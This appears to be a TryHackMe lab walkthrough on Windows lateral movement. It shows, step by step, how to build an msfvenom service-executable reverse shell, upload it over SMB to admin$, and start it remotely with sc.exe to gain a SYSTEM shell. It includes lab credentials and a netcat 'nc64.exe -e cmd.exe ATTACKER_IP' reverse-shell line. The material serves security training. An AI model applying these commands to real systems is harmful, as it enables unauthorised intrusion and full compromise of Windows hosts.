# Spawning Processes Remotely Walkthrough

Connect to THMJMP2 using credentials from http://distributor.za.tryhackme.com/creds  

<pre>ssh za\\grace.brooks@thmjmp2.za.tryhackme.com</pre>

THM has provided credentials with administrative access:  
- ZA.TRYHACKME.COM\t1_leonard.summers  
- EZpass4ever  

If we try to run a reverse shell using `sc.exe` command and `net user`, we notice that the reverse shell disconnects after execution.  

Service executables are different to .exe files, and therefore non-service executables will end up being killed by the service manager almost immediately.  

msfvenom supports the `exe-service` format, which will encapsulate any payload we like inside a fully functional service executable, preventing it from being killed.  

- Create payload using msfvenom (Attack Box)
<pre>msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKERIP LPORT=4444 -o myservice.exe</pre>

- Upload payload to THMIIS using t1_leonard.summers (Attack Box)
<pre>smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/'</pre>

- Setup listener on attacker machine to receive reverse shell once `myservice.exe` has been executed

<pre>msfconsole  
use exploit/multi/handler  
exploit(multi/handler) > set LHOST lateralmovement 
exploit(multi/handler) > set LPORT 4444
exploit(multi/handler) > set payload windows/shell/reverse_tcp
exploit(multi/handler) > exploit  

Started reverse TCP handler on 10.10.10.16:4444</pre>

- Spawn a reverse shell with t1_leonard.summers access (THMJMP2)
<pre>runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"</pre>

- `runas` with `/netonly` it will not check if the provided credentials are valid
- Receive reverse shell from `runas` command using `nc` 
<pre>nc -lvp 4443</pre>  

- Create a new service by using `sc.exe` (THMJMP2 command prompt as t1_leonard.summers from nc reverse shell)
<pre>sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto  
sc.exe \\thmiis.za.tryhackme.com start THMservice-3249</pre>

- Receive reverse shell on msfconsole session
<pre>msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.50.119.158:4444 
[*] Sending stage (240 bytes) to 10.200.122.201
[*] Command shell session 1 opened (10.50.119.158:4444 -> 10.200.122.201:61780) at 2023-11-21 12:43:46 -0500
-

Shell Banner:
Microsoft Windows [Version 10.0.17763.1098]
-----
          

C:\Windows\system32>whoami
whoami
nt authority\system</pre>

![Alt text](<../../Images/Spawn Process Remotely Diagram.jpg>)